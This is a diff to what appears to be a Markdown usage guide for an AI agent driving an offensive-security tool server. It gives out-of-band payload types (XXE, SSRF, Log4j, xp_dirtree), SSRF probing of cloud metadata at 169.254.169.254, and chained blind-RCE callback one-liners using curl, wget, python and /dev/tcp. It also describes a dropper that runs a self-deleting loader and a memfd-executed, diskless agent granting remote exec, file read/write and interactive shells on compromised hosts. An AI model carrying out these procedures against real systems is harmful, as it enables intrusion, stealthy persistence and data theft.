@@ -16,67 +16,131 @@ Scopes required: `oast:read,oast:write` for OAST tools; `agent:admin` for agent 
 ## OAST Workflow
 
 ```
-oast_create_session → oast_generate_payload → inject into TARGET → oast_wait_for_event → oast_close_session
+oast_create_session → oast_generate_payload → inject → oast_wait_for_event → oast_close_session
 ```
 
 1. **`oast_create_session`** → `session_id` + DNS/HTTP/HTTPS callback endpoints.
-   - **Save the `session_id` — use the SAME value in every subsequent call.**
-2. **`oast_generate_payload`** (pass the same `session_id`) → ready-to-inject string.
-   - `type`: `url`, `xxe`, `ssrf`, `log4j`, `img-tag`, `css-import`, `sqli-oob`
+2. **`oast_generate_payload`** → ready-to-inject string.
    - `label`: tags the injection point in the subdomain (e.g. `"ua-header"`) — use it to identify which field fired.
-3. **Inject** the payload string into the TARGET (e.g. HTTP header, form field, XML parameter).
-   - The callback only proves something if the TARGET's server triggers it.
-4. **`oast_wait_for_event`** (same `session_id`) — blocks up to 30s for the next callback. Use this immediately after injection.
+   - `dns_hostname` is always returned — use it directly when the payload string doesn't fit the injection context.
+3. **Inject** into the target.
+4. **`oast_wait_for_event`** — blocks up to 30s for the next callback. Use this immediately after injection.
 5. **`oast_list_events`** — returns already-arrived events (history/pagination). Use for review, not real-time detection.
 6. **`oast_close_session`** when done.
+
+### Payload type selection
+
+| Context | Recommended type | Why |
+|---|---|---|
+| Unknown / first probe | `url` | Use `dns_hostname` directly; DNS fires even when HTTP is blocked |
+| HTTP param, header, redirect | `url` or `ssrf` | Direct HTTP callback from server |
+| XML input | `xxe` | DTD entity injection |
+| SQL injection (MSSQL) | `sqli-oob` | `xp_dirtree` DNS lookup |
+| HTML / template injection | `img-tag` | Browser-triggered HTTP |
+| CSS injection | `css-import` | Browser-triggered HTTP |
+| Java app with unpatched Log4j | `log4j` | JNDI LDAP via DNS — legacy targets only |
+
+Regardless of type, `dns_hostname` is always returned. A DNS-only event (no HTTP) is still a valid finding.
+
+### Blind SSRF strategy
+
+SSRF is server-side: you inject a URL and the **server** fetches it — not the browser.
+
+1. **Start with DNS**: use `url` type and pass `dns_hostname` raw. If DNS fires, the server can reach the internet.
+2. **DNS fires, HTTP doesn't**: server may filter HTTP/HTTPS egress. Try internal targets: `169.254.169.254` (cloud metadata), `10.x.x.x`, `192.168.x.x`.
+3. **Nothing fires after 2–3 probes**: the server can't make outbound connections, or the parameter doesn't trigger server-side requests.
+4. **Use `label`** to tag each injection point (`"referer"`, `"x-forwarded-for"`, `"pdf-url"`, `"avatar-url"`) — you'll see exactly which field fired in the event subdomain.
+5. SSRF often only resolves DNS — the full HTTP request may be blocked or stripped. A DNS-only event is still a valid finding.
+
+### No HTTP client on target (RCE)
+
+> **Blind RCE warning:** In blind RCE you cannot see stderr or command output at all.
+> Never probe tools sequentially — "curl: command not found" is invisible.
+> Instead, **chain all fallbacks in a single command using `||`** and use event `label`s
+> to discover which tool fired via the OAST callback.
+
+**Blind probe template** — generate four payloads with labels `probe-curl`, `probe-wget`, `probe-py3`, `probe-dns`, then inject this single command:
+
+```sh
+curl -sk https://<probe-curl-host>/ 2>/dev/null ||
+wget -q -O/dev/null https://<probe-wget-host>/ 2>/dev/null ||
+python3 -c "import urllib.request; urllib.request.urlopen('https://<probe-py3-host>/')" 2>/dev/null ||
+nslookup <probe-dns-host>
+```
+
+Call `oast_wait_for_event` once — whichever label fires tells you what tool is available on the target. Use that tool for all subsequent operations. `nslookup` at the end is the guaranteed DNS fallback: it requires no HTTP client and fires even through strict egress firewalls.
+
+**If you have interactive output** (non-blind RCE), try in order:
+
+```
+1. curl      curl -sk https://<dns_hostname>/
+2. wget      wget -q -O- https://<dns_hostname>/
+3. python3   python3 -c "import urllib.request; urllib.request.urlopen('https://<dns_hostname>/')"
+4. python2   python -c "import urllib2; urllib2.urlopen('https://<dns_hostname>/')"
+5. perl      perl -e 'use LWP::Simple; get("https://<dns_hostname>/");'
+6. ruby      ruby -e 'require "net/http"; Net::HTTP.get(URI("https://<dns_hostname>/"))'
+7. bash      bash -c 'exec 3<>/dev/tcp/<dns_hostname>/80'  # TCP only, triggers DNS
+8. nslookup  nslookup <dns_hostname>    # DNS only — no HTTP needed
+9. dig       dig <dns_hostname>         # DNS only
+10. ping     ping -c 1 <dns_hostname>   # DNS only (resolves then ICMPs)
+```
+
+**If nothing works**: DNS always works on almost any system. Use `url` type, take `dns_hostname`, and run `nslookup`/`dig`/`ping` — the DNS resolution still registers as an event.
 
 ---
 
 ## Agent Workflow
 
 ```
-probe OS/arch → agent_dropper_generate → run command on target → agent_list → agent_task_schedule → poll agent_task_status
+probe OS/arch → agent_dropper_generate → run command on target → agent_list → agent_task_schedule → agent_task_status
 ```
 
 1. **Probe** target: `uname -m` (Linux) or `$ENV:PROCESSOR_ARCHITECTURE` (Windows).
 2. **`agent_dropper_generate`**: pass `agent_id`, `os_arch`, `ttl`, and `delivery`.
-   - `delivery: "url"` — target fetches loader over HTTPS. Returns `curl_cmd`, `wget_cmd`, `python3_cmd`.
-   - `delivery: "inline"` — loader embedded as base64 (~77KB). Returns `b64_cmd`, `python3_b64_cmd`. No outbound HTTP needed.
-   - `insecure: true` — (optional) skip TLS certificate verification end-to-end. Use ONLY when the target has no CA bundle (e.g. minimal containers). Adds `-k` to the loader and all download commands; the flag is propagated to Stage 2 so the agent's WebSocket connection and `fetch_url` requests also skip verification. **This is recorded in the audit log and stored in the agent session.**
-3. **Try commands in fallback order** — assume nothing is installed. Stop at the first that succeeds:
-
-   | Platform | Fallback chain |
-   |----------|----------------|
-   | Linux url | `curl_cmd` → `wget_cmd` → `python3_cmd` |
-   | Linux inline | `b64_cmd` → `python3_b64_cmd` |
-   | Windows url | `curl_cmd` (curl.exe built-in since Win10 1803) |
-   | Windows inline | `b64_cmd` (pure PowerShell) |
-
-   If a command fails with "command not found" or "not recognized" → next fallback immediately.
-   If all URL fallbacks fail → call `agent_dropper_generate` again with `delivery: "inline"`.
-
-   **The loader daemonizes immediately** — the dropper command returns right away while Stage 2 is downloaded in the background. This is critical for web exploitation where the parent process (e.g. a request handler) may be killed when the HTTP request ends.
-
-4. **`agent_list`** — confirm `status: "online"` before scheduling. Because the loader daemonizes, the agent may not appear instantly — wait a few seconds and poll `agent_list` until it shows `status: "online"`. The agent token `--sub` must match the MCP session subject (same tenant). The response includes an `insecure` field indicating whether the agent is running in certificate-skip mode.
+   - `delivery: "url"` — returns `curl_cmd`/`wget_cmd`; target fetches loader over HTTPS. Use when egress is open.
+   - `delivery: "inline"` — returns `b64_cmd` with loader embedded (~90-150KB base64 for Linux). Use when egress is blocked.
+3. **Run** the returned command on target via the RCE primitive.
+   > **One-shot dropper:** The loader self-deletes the moment it runs. If the agent fails to start (network error, bad token), the loader is already gone — you must re-run `agent_dropper_generate` and re-deliver to retry.
+   >
+   > **No disk artifact (Linux):** The stage-2 agent binary is loaded directly into an anonymous memfd and exec'd from `/proc/self/fd/N` — it is never written to disk.
+   >
+   > **Auto-cleanup (Windows):** The stage-2 agent temp file and the loader `.exe` are both marked delete-on-close; they are removed automatically when the respective process exits.
+4. **`agent_list`** — confirm `status: "online"` before scheduling. The agent token `--sub` must match the MCP session subject (same tenant).
 5. **`agent_task_schedule`** → returns `task_id` immediately (async). The `timeout_secs` parameter here is the **task execution timeout** — the deadline for the agent to finish the work (default 600s, max 86400s).
-6. **`agent_task_status`** — by default blocks server-side (up to 30s) until the task completes. No polling needed.
-   - `wait` (bool, default `true`): blocks until `done`/`error` or the wait timeout elapses.
-   - `timeout_secs` (number, default 30, max 120): how long this status call blocks — independent of the task execution timeout set in step 5.
-   - If `timed_out: true`, the task is still running — call `agent_task_status` again.
-   - Set `wait: false` to get current status instantly (use when checking multiple tasks in parallel).
+6. **`agent_task_status`** — by default blocks (up to 30s) until the task completes. No polling needed.
+   - `wait` (bool, default `true`): blocks server-side until the task reaches `done`/`error` or the wait timeout elapses.
+   - `timeout_secs` (number, default 30, max 120): **wait timeout** — how long this status call blocks. Independent of the task execution timeout set in step 5.
+   - Response includes `timed_out: true` when the wait timeout fires before the task completes.
+   - Set `wait: false` to get the current status instantly without blocking. Use this when checking multiple tasks in parallel, showing intermediate progress, or doing other work between checks.
+   - If `timed_out: true`, call `agent_task_status` again (the task is still running on the agent).
 
 ## Capability Reference
 
-| Capability    | Params                                    | Result fields                    |
-|---------------|-------------------------------------------|----------------------------------|
-| `exec`        | `cmd` (str), `timeout` (int, default 30)  | `output` (str), `exit_code` (int)|
-| `read_file`   | `path` (str)                              | `content` (**base64**), `path`   |
-| `fetch_url`   | `url` (str), `timeout` (int, default 15)  | `status` (int), `body` (**base64**)|
-| `system_info` | —                                         | `hostname`, `os`, `arch`, `user` |
+| Capability         | Params                                                             | Result fields                    |
+|--------------------|--------------------------------------------------------------------|----------------------------------|
+| `read_file`        | `path` (str)                                                       | `content` (**base64**), `path`   |
+| `write_file`       | `path` (str), `content_b64` (str, base64), `mode` (str, e.g. "0755") | `bytes_written` (int)           |
+| `fetch_url`        | `url` (str), `timeout` (int, default 15)                           | `status` (int), `body` (**base64**)|
+| `system_info`      | —                                                                  | `hostname`, `os`, `arch`, `user` |
+| `exec`             | `cmd` (str), `timeout` (int, default 30)                           | `output` (str), `exit_code` (int)|
+| `interactive_exec` | `command` (str), `binary` (bool, default false)                    | Use `agent_task_interact` for I/O |
 
 `read_file` and `fetch_url` results are base64-encoded — decode before interpreting content.
 
-> **`fetch_url` and TLS:** when the agent was deployed with `insecure: true`, `fetch_url` also skips TLS certificate verification. On targets without a CA bundle, use HTTP URLs or deploy with `insecure: true` to reach HTTPS targets.
+### Interactive exec workflow
+
+Use `interactive_exec` when you need to interact with a process (e.g. a setuid binary, a shell, a CLI tool that prompts for input).
+
+```
+agent_task_schedule(capability="interactive_exec", params={"command": "bash"})
+  → task_id
+agent_task_interact(task_id=...)                    → read initial output (prompt)
+agent_task_interact(task_id=..., stdin="id\n")      → send command, read response
+agent_task_interact(task_id=..., stdin="exit\n")    → exit, running=false + exit_code
+```
+
+**Escape sequences in `stdin`** are interpreted as C-style escapes before sending:
+`\n` = newline, `\r` = CR, `\t` = tab, `\\` = literal backslash, `\xNN` = hex byte (e.g. `\x03` = Ctrl-C, `\x04` = Ctrl-D, `\x1b` = Escape).
 
 ---
 
@@ -84,18 +148,11 @@ probe OS/arch → agent_dropper_generate → run command on target → agent_lis
 
 | Mistake | Fix |
 |---------|-----|
-| `agent_list` returns empty after running dropper | The loader daemonizes and returns immediately — the agent needs a few seconds to download Stage 2 and connect. Wait and retry `agent_list`. Also check that the token `--sub` equals the MCP session subject (same tenant). If the agent never appears, retry with `-f` added to the loader command to see errors on stderr |
-| Agent fails on minimal container / no CA certs | Set `insecure: true` in `agent_dropper_generate` or add `-k` to the loader command. Use only when strictly needed — the flag is audited and stored in the agent's session record |
-| `fetch_url` fails with certificate error | The agent was deployed without `insecure: true`. On targets without a CA bundle, use HTTP URLs or redeploy with `insecure: true` |
+| `agent_list` returns empty after running dropper | Token `--sub` must equal the MCP session subject; different subjects = different tenants |
 | Task stuck in `pending` | Confirm agent is `online` first; dispatch loop polls every 2s |
-| Polling `agent_task_status` with `wait: false` in a loop | Use the default `wait: true` — it blocks server-side up to 30s. Only use `wait: false` for parallel task checks |
+| Polling `agent_task_status` with `wait: false` in a loop | Use the default `wait: true` — it blocks server-side up to 30s. Only use `wait: false` for parallel task checks or intermediate progress |
 | Confusing task timeout with wait timeout | `timeout_secs` in `agent_task_schedule` = agent execution deadline. `timeout_secs` in `agent_task_status` = how long the status call blocks |
 | Polling `oast_list_events` in a loop after injection | Use `oast_wait_for_event` — it blocks server-side; `list_events` returns history only |
-| `oast_wait_for_event` always times out | (1) Verify payload was injected into the target, not just fetched locally; (2) confirm `session_id` matches the one from `oast_create_session` — a stale or different ID means events route to a different session |
-| Curling the callback URL yourself to "verify" | Don't. Self-fetching proves nothing — only the TARGET triggering the payload is a valid callback |
-| Using a payload URL from a previous/different session | Always call `oast_generate_payload` with the current `session_id`; never reuse callback hostnames from old sessions |
-| `curl: command not found` | Try `wget_cmd`, then `python3_cmd`; fall back to `delivery: "inline"` if all fail. |
-| Or no callback or effect when trying blind injections | Try to use multiple commands with the `or` operator (e.g., `curl xxx \|\| wget -Oyyy xxxx \|\| python3 xxxx` )  | 
-| `base64: command not found` | Use `python3_b64_cmd` instead of `b64_cmd` |
 | Target is air-gapped, no outbound HTTP | Set `delivery: "inline"` in `agent_dropper_generate` |
 | `read_file`/`fetch_url` content unreadable | The `content`/`body` field is base64 — decode it |
+| No OAST callback after injecting curl command | In blind RCE, curl may be absent but you'll never see the error. Use the blind probe template (chain `curl \|\| wget \|\| python3 \|\| nslookup` with labels) — see "No HTTP client on target" |
